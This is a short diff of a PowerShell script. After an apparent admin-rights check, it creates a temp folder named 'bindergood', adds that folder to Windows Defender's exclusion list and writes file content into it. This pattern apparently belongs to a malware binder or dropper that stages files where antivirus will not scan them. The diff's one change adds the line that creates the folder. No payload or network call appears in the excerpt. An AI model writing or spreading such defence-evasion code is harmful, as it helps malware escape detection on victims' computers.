@@ -4,5 +4,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 $directoryPath = "$env:temp\bindergood"
+New-Item -Path $directoryPath -ItemType Directory
 Add-MpPreference -ExclusionPath $directoryPath
 Set-Content -Path $tempFile -Value $Filecontent
